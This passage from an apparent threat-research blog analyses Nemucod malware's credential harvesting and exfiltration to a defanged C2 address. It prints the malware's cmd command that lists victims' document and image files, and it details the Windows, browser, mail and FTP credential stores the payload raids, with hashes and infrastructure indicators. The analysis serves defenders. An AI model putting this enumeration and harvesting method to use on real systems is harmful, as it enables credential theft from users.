			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
cmd /U /Q /C cd /D DriveLetter: &amp;&amp; dir /b/s/x &lt;file_extension_list&gt; &gt;&gt; %temp%\\pollos.txt

&lt;file_extension_list&gt;:

*.doc *.xls *.pub *.odt *.ods *.odp *.odm *.odc *.odb *.wps 
*.xlk *.ppt *.mdb *.accdb *.pst *.dwg *.dxf *.dxg *.wpd 
*.rtf *.wb2 *.mdf *.dbf *.psd *.pdd *.eps *.ai *.indd *.cdr 
*.dng *.3fr *.arw *.srf *.sr2 *.bay *.crw *.cr2 *.dcr *.kdc 
*.erf *.mef *.mrw *.nef *.nrw *.orf *.raf *.raw *.rwl *.rw2 
*.r3d *.ptx *.pef *.srw *.x3f *.der *.txt *.pdf</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8ad10899728815-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad10899728815-2">2</div><div class="crayon-num" data-line="crayon-5f69287a8ad10899728815-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad10899728815-4">4</div><div class="crayon-num" data-line="crayon-5f69287a8ad10899728815-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad10899728815-6">6</div><div class="crayon-num" data-line="crayon-5f69287a8ad10899728815-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad10899728815-8">8</div><div class="crayon-num" data-line="crayon-5f69287a8ad10899728815-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad10899728815-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8ad10899728815-1"><span class="crayon-v">cmd</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">U</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Q</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">C</span><span class="crayon-h"> </span><span class="crayon-v">cd</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">D</span><span class="crayon-h"> </span><span class="crayon-v">DriveLetter</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">dir</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">b</span><span class="crayon-o">/</span><span class="crayon-v">s</span><span class="crayon-o">/</span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">file_extension_list</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-v">temp</span><span class="crayon-o">%</span><span class="crayon-sy">\</span><span class="crayon-sy">\</span><span class="crayon-v">pollos</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad10899728815-2">&nbsp;</div><div class="crayon-line" id="crayon-5f69287a8ad10899728815-3"><span class="crayon-o">&lt;</span><span class="crayon-v">file_extension_list</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad10899728815-4">&nbsp;</div><div class="crayon-line" id="crayon-5f69287a8ad10899728815-5"><span class="crayon-o">*</span><span class="crayon-sy">.</span><span class="crayon-e ">doc *</span><span class="crayon-sy">.</span><span class="crayon-e ">xls *</span><span class="crayon-sy">.</span><span class="crayon-e ">pub *</span><span class="crayon-sy">.</span><span class="crayon-e ">odt *</span><span class="crayon-sy">.</span><span class="crayon-e ">ods *</span><span class="crayon-sy">.</span><span class="crayon-e ">odp *</span><span class="crayon-sy">.</span><span class="crayon-e ">odm *</span><span class="crayon-sy">.</span><span class="crayon-e ">odc *</span><span class="crayon-sy">.</span><span class="crayon-e ">odb *</span><span class="crayon-sy">.</span><span class="crayon-e ">wps </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad10899728815-6"><span class="crayon-e ">*</span><span class="crayon-sy">.</span><span class="crayon-e ">xlk *</span><span class="crayon-sy">.</span><span class="crayon-e ">ppt *</span><span class="crayon-sy">.</span><span class="crayon-e ">mdb *</span><span class="crayon-sy">.</span><span class="crayon-e ">accdb *</span><span class="crayon-sy">.</span><span class="crayon-e ">pst *</span><span class="crayon-sy">.</span><span class="crayon-e ">dwg *</span><span class="crayon-sy">.</span><span class="crayon-e ">dxf *</span><span class="crayon-sy">.</span><span class="crayon-e ">dxg *</span><span class="crayon-sy">.</span><span class="crayon-e ">wpd </span></div><div class="crayon-line" id="crayon-5f69287a8ad10899728815-7"><span class="crayon-e ">*</span><span class="crayon-sy">.</span><span class="crayon-e ">rtf *</span><span class="crayon-sy">.</span><span class="crayon-e ">wb2 *</span><span class="crayon-sy">.</span><span class="crayon-e ">mdf *</span><span class="crayon-sy">.</span><span class="crayon-e ">dbf *</span><span class="crayon-sy">.</span><span class="crayon-e ">psd *</span><span class="crayon-sy">.</span><span class="crayon-e ">pdd *</span><span class="crayon-sy">.</span><span class="crayon-e ">eps *</span><span class="crayon-sy">.</span><span class="crayon-e ">ai *</span><span class="crayon-sy">.</span><span class="crayon-e ">indd *</span><span class="crayon-sy">.</span><span class="crayon-e ">cdr </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad10899728815-8"><span class="crayon-e ">*</span><span class="crayon-sy">.</span><span class="crayon-e ">dng *</span><span class="crayon-sy">.</span><span class="crayon-cn">3fr</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">.</span><span class="crayon-e ">arw *</span><span class="crayon-sy">.</span><span class="crayon-e ">srf *</span><span class="crayon-sy">.</span><span class="crayon-e ">sr2 *</span><span class="crayon-sy">.</span><span class="crayon-e ">bay *</span><span class="crayon-sy">.</span><span class="crayon-e ">crw *</span><span class="crayon-sy">.</span><span class="crayon-e ">cr2 *</span><span class="crayon-sy">.</span><span class="crayon-e ">dcr *</span><span class="crayon-sy">.</span><span class="crayon-e ">kdc </span></div><div class="crayon-line" id="crayon-5f69287a8ad10899728815-9"><span class="crayon-e ">*</span><span class="crayon-sy">.</span><span class="crayon-e ">erf *</span><span class="crayon-sy">.</span><span class="crayon-e ">mef *</span><span class="crayon-sy">.</span><span class="crayon-e ">mrw *</span><span class="crayon-sy">.</span><span class="crayon-e ">nef *</span><span class="crayon-sy">.</span><span class="crayon-e ">nrw *</span><span class="crayon-sy">.</span><span class="crayon-e ">orf *</span><span class="crayon-sy">.</span><span class="crayon-e ">raf *</span><span class="crayon-sy">.</span><span class="crayon-e ">raw *</span><span class="crayon-sy">.</span><span class="crayon-e ">rwl *</span><span class="crayon-sy">.</span><span class="crayon-e ">rw2 </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad10899728815-10"><span class="crayon-e ">*</span><span class="crayon-sy">.</span><span class="crayon-e ">r3d *</span><span class="crayon-sy">.</span><span class="crayon-e ">ptx *</span><span class="crayon-sy">.</span><span class="crayon-e ">pef *</span><span class="crayon-sy">.</span><span class="crayon-e ">srw *</span><span class="crayon-sy">.</span><span class="crayon-e ">x3f *</span><span class="crayon-sy">.</span><span class="crayon-e ">der *</span><span class="crayon-sy">.</span><span class="crayon-e ">txt *</span><span class="crayon-sy">.</span><span class="crayon-v">pdf</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>During communication with the remote host IP mentioned above, the JSE may download another Portable Executable (PE), the payload of which could differ. In this versions case, and on this occasion, a Base64-encoded, UPX-packed PE file (SHA256:76b703c9430abf4e0ba09e6d4e4d6cf94a251bb0e7f3fadbd169fcef954a8b39) was downloaded and responsible for injecting another PE component (SHA256:53edea186162d84803f8ff72fb83c85f427b3813c32bd9d9d899e74ae283368e) into memory to carry out the credential harvesting and exfiltration duties discussed next. Its possible the actors could switch this malware out to another depending on their objectives and motivations. The Polish CERT team posted a <a href="https://www.cert.pl/en/news/single/evil-a-poor-mans-ransomware-in-javascript/">blog</a> earlier this year describing related malware that ultimately resulted in ransomware however during our research we have not seen such behaviour.</p>
<p><strong>Credential Harvesting</strong></p>
<p>Analysing one of the payload files installed by Nemucod in more detail shows the extent of credential stealing capabilities. The payload enumerates various Operating System and application credential stores in order to harvest as many credentials as possible.</p>
<p><strong>Protected Storage (Pstore)</strong></p>
<p>After determining the running Operation System is a legacy version, such as Windows XP, the malware starts by attempting to load the pstorec.dll library, to access the legacy Windows data store, Pstore. If successful a call to the PStoreCreateInstance function to get the pointer to protected storage will be made to allow calls to functions that enumerate and retrieve any stored credentials, as shown in Figure 26 below.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_23.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29603" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_23.png" alt="nemucod_23" width="867" height="423" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_23.png 867w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_23-380x184.png 380w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_23-300x146.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_23-768x375.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_23-370x181.png 370w" sizes="(max-width: 867px) 100vw, 867px" /></a></p>
<p>Figure 26: Payload code to gain access to legacy Windows Pstore.</p>
<p><strong>Credential Cache</strong></p>
<p>The malware then checks the credential cache, which is used in later versions of Windows, and allows all built-in applications in Windows Internet Explorer to store and use credentials automatically. Credentials using HTTPs basic authentication passwords can be stored here as well as network login passwords. The malware searches specifically for the latter by filtering for passwords starting Microsoft_WinInet_* to attain only credentials stored by Internet Explorer, as shown in Figure 27 below:</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_24.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29579" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_24.png" alt="nemucod_24" width="937" height="611" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_24.png 937w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_24-900x587.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_24-300x196.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_24-768x501.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_24-370x241.png 370w" sizes="(max-width: 937px) 100vw, 937px" /></a></p>
<p>Figure 27: Payload code accessing Internet Explorer stored credentials</p>
<p>The 128-bit value Globally Unique Identifier (GUID) abe2869f-9b47-4cd9-a358-c22904dba7f7 shown in Figure 27 is used in conjunction with the built-in Windows Cryptography functions to encrypt and, in the malwares case, decrypt the stored credentials attained.</p>
<p><strong>Windows Vault</strong></p>
<p>Before moving on to harvesting data from browsers and other applications the actors check one final credential store  Microsofts Windows Vault, which is part of built-in Credential Manager. Providing the victims Operation System is 6.2 (Windows 8 or Windows Server 2012) the malware loads the Vault Client Access Library (vaultcli.dll) and uses it to access stored credentials.</p>
<p><strong>Browsers</strong></p>
<p>The actors then shift their attention to web-browsers including Firefox, Chrome and Opera (Internet Explorer has been covered by the previous steps already). The malware enumerates various Windows Registry keys gathering installation folder paths for these browsers before attempting to harvests credentials stored by them.</p>
<p>Using Chrome as an example, the malware locates the sqlite database files created and used by the browser to store various pieces of information. One of the sqlite files the actors target is named Web Data and includes autofill information for auto-populating HTML forms for logins, postal addresses and so on. The sqlite command .tables lists the table names as shown below:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8ad15079561761" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
sqlite&gt; .tables
autofill                 credit_cards             server_addresses       
autofill_profile_emails  ie7_logins               server_card_metadata   
autofill_profile_names   keywords                 token_service          
autofill_profile_phones  masked_credit_cards      unmasked_credit_cards  
autofill_profiles        meta                   
autofill_profiles_trash  server_address_metadata</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8ad15079561761-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad15079561761-2">2</div><div class="crayon-num" data-line="crayon-5f69287a8ad15079561761-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad15079561761-4">4</div><div class="crayon-num" data-line="crayon-5f69287a8ad15079561761-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad15079561761-6">6</div><div class="crayon-num" data-line="crayon-5f69287a8ad15079561761-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8ad15079561761-1"><span class="crayon-v">sqlite</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-e">tables</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad15079561761-2"><span class="crayon-e">autofill&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">credit_cards&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">server_addresses&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-5f69287a8ad15079561761-3"><span class="crayon-e">autofill_profile_emails&nbsp;&nbsp;</span><span class="crayon-e">ie7_logins&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">server_card_metadata&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad15079561761-4"><span class="crayon-e">autofill_profile_names&nbsp;&nbsp; </span><span class="crayon-e">keywords&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">token_service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5f69287a8ad15079561761-5"><span class="crayon-e">autofill_profile_phones&nbsp;&nbsp;</span><span class="crayon-e">masked_credit_cards&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">unmasked_credit_cards&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad15079561761-6"><span class="crayon-e">autofill_profiles&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">meta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-5f69287a8ad15079561761-7"><span class="crayon-e">autofill_profiles_trash&nbsp;&nbsp;</span><span class="crayon-v">server_address_metadata</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>Looking at the data held in my test systems autofill table, in the Web Data database, you can see details related to a previous HTML form completion using a fictitious first and last name and cell phone number.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8ad18357465346" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
sqlite&gt; select * from autofill;
FirstName|Bob|bob|n|n|1
LastName|REDACTED|REDACTED|n|n|1
deviceAddress|REDACTED|REDACTED|n|n|1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8ad18357465346-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad18357465346-2">2</div><div class="crayon-num" data-line="crayon-5f69287a8ad18357465346-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad18357465346-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8ad18357465346-1"><span class="crayon-v">sqlite</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e ">select *</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-v">autofill</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad18357465346-2"><span class="crayon-v">FirstName</span><span class="crayon-o">|</span><span class="crayon-v">Bob</span><span class="crayon-o">|</span><span class="crayon-v">bob</span><span class="crayon-o">|</span><span class="crayon-v">n</span><span class="crayon-o">|</span><span class="crayon-v">n</span><span class="crayon-o">|</span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-5f69287a8ad18357465346-3"><span class="crayon-v">LastName</span><span class="crayon-o">|</span><span class="crayon-v">REDACTED</span><span class="crayon-o">|</span><span class="crayon-v">REDACTED</span><span class="crayon-o">|</span><span class="crayon-v">n</span><span class="crayon-o">|</span><span class="crayon-v">n</span><span class="crayon-o">|</span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad18357465346-4"><span class="crayon-v">deviceAddress</span><span class="crayon-o">|</span><span class="crayon-v">REDACTED</span><span class="crayon-o">|</span><span class="crayon-v">REDACTED</span><span class="crayon-o">|</span><span class="crayon-v">n</span><span class="crayon-o">|</span><span class="crayon-v">n</span><span class="crayon-o">|</span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>Another database accessed by the malware is named Login Data that includes a table logins containing information such as the example below showing a login to Googles accounts service to access mail, calendars and more.</p>
<p><a name="_Toc476162533"></a><strong>Email Clients</strong></p>
<p>The next focus is on harvest credentials from email clients installed on the victims system, starting with Outlook and Outlook Express. The malware checks the registry key HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts for data relating to such installed clients or Windows address books, and enumerates all of the Server, User and Password values for SMTP, POP3 and IMAP protocol types, as shown in the Figure 28 below, and gathers the respective data.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_25.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29555" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_25.png" alt="nemucod_25" width="917" height="629" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_25.png 917w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_25-900x617.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_25-300x206.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_25-768x527.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_25-370x254.png 370w" sizes="(max-width: 917px) 100vw, 917px" /></a></p>
<p>Figure 28: Windows registry storing some email client account credentials</p>
<p>The malware continues to check for other installed mail clients, including Mozillas Thunderbird, RITLabs TheBat!, Windows Mail and Windows Live Mail, to harvest yet more credentials.</p>
<p>The mail client TheBat! written by software company RITLabs happens to be based in Chisinau in the Republic of Moldova. This is interesting as some of the infrastructure used by the threat actors, which I discuss in more detail later, is located in or registered to places in the same country.</p>
<p>Finally, the malware checks for various software applications that communicate over SSH (Secure Shell), FTP (File Transfer Protocol) and HTTP protocols often used to remotely connect and administer systems or to transfer files between systems. The goal here is to harvest any stored credentials as well as system hostnames and IP addresses. Credentials stored in these types of applications would be very useful for attackers who wish to move through the compromised network for further reconnaissance or performing other attack objectives.</p>
<p>The applications in question include WinSCP (Windows Secure Copy) used for copying files over SSH and Total Commander (Ghilser), FileZilla, FlashFXP, Cyberduck, CoffeeCup Software, CuteFTP and SmartFTP all of which include FTP capabilities.</p>
<p><strong>Exfiltration</strong></p>
<p>Any credentials found by the malware will be stored in a text file in the victims temporary folder in preparation for exfiltration. In this versions case the file was named as follows:</p>
<p>%TEMP%\goga.txt</p>
<p>The format of this text file is as shown below and contains the unique identifier (uid) that was used earlier during the registration process, together with the date and time, allowing for the actors to sift their data accordingly, before the list of any credentials harvested during execution describing the protocols and ports required, usernames, passwords and hostnames.</p>
<p style="padding-left: 30px;">TEST-UID</p>
<p style="padding-left: 30px;">YYYY-MM-DD HH:MM:SS</p>
<p style="padding-left: 30px;">ftp://username:password@ftp.somedomain.com:21</p>
<p style="padding-left: 30px;">https://username:password@accounts.somedomain.com/</p>
<p>The final phase for this malware is to offload all the information harvested to the actors by communicating using a HTTP POST request under the pretence of a Windows 7 Operating System and FireFox browser by setting the HTTP HEADERs User-Agent field to the following string:</p>
<p style="padding-left: 30px;">Mozilla/5.0 (Windows NT 6.1; rv:45.0)</p>
<p>The malware makes calls to the InternetOpenA, InternetConnectA and HttpOpenRequest functions from the Wininet.dll library to prepare the HTTP POST request to the following URL where the contents of goga.txt will be sent.</p>
<p>http://185.159.82[.]11/re/b.php</p>
<p><strong>Infrastructure:</strong></p>
<p><a name="_Toc476162536"></a>WHOIS reports the following for the IP address used in this version of the malware to both register the victim system infection and to exfiltrate the stolen credentials:</p>
<ul>
<li>The IP belongs to a Russian-owned hosting service, King Servers</li>
<li>The IP resolves to domain customer.clientshostname.com</li>
</ul>
<p>Investigating IP and hostname information for all the samples gathered in this research shows a much wider infrastructure, described in more detail below, however, remaining focussed on the single IP discussed throughout this blog and, as shown in Figure 29 below, there are malware samples (the red circles) including weaponized documents (red circles) and PE file samples (red circles with blue bookmark) as well as domain names (blue circles) associated with the domain name resolved from said IP  customer.clientshostname.co.uk.</p>
<p>The vast majority of the samples in figure 29 were first seen in AutoFocus between January and March in 2017 except for two that were seen in late December 2016. The IP address resolved to the hostname customer.clientshostname[.]com depicted by the orange circle in the center of the figure; the blue circles attached represent sub-domains of clientshostname[.]com that mostly appear to use a firstlast name convention, such as joebloggs. Some of these sub-domains have been linked, through reverse DNS, to IP address Indicators of Compromise (IOCs) listed in the Grizzly Steppe <a href="https://www.us-cert.gov/security-publications/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity">report</a>. From the samples analysed it is not clear how these subdomains are being used.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_26.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29531" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_26.png" alt="nemucod_26" width="871" height="1055" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_26.png 871w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_26-248x300.png 248w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_26-768x930.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_26-845x1024.png 845w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_26-370x448.png 370w" sizes="(max-width: 871px) 100vw, 871px" /></a></p>
<p>Figure 29: Partial infrastructure</p>
<p>The following figure highlights another two IP addresses (185.130.104[.]156 and 185.130.104[.]178) that reside in the same class C network range together and within the same class B network range as the IP from the previous figure. All versions in this figure are weaponized documents except for one that is a PE executable credential stealer (depicted again by a red circle blue bookmark) and most reference IP 185.130.104[.]156 at the base and center of the semi-circle in the figure, and in the zoomed-in box. All but one of these samples were seen in AutoFocus in November 2016 with the outlier (arrow #1) seen in late December.</p>
<p>Interestingly, this IP address also had some associated domain names, as shown in the zoomed-in box as well, including letstrade-bit[.]com, lesbtc[.]com (and mail.lesbtc[.]com) and secure-trade24[.]com with the former two domains being registered December 20<sup>th</sup> and the latter on December 14<sup>th</sup>. All three domains mention trading or Bitcoins (BTC) but from the samples analysed, it is not clear how these subdomains are being used, however such terms are indicative of contemporary ransomware that requests ransom payments using BTC.</p>
<p>IP 185.130.104[.]178 (arrow #2) has three associated weaponized document versions all of which were seen in AutoFocus in the last week of February, which together with aforementioned IP addresses, indicates how different waves of this campaign occur over different months and how the actors switch to using different IP addresses within the infrastructure for their C2 communication.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Partial-Infra.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-30158" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Partial-Infra.png" alt="partial-infra" width="1086" height="788" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Partial-Infra.png 1086w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Partial-Infra-900x653.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Partial-Infra-300x218.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Partial-Infra-768x557.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Partial-Infra-1024x743.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Partial-Infra-370x268.png 370w" sizes="(max-width: 1086px) 100vw, 1086px" /></a></p>
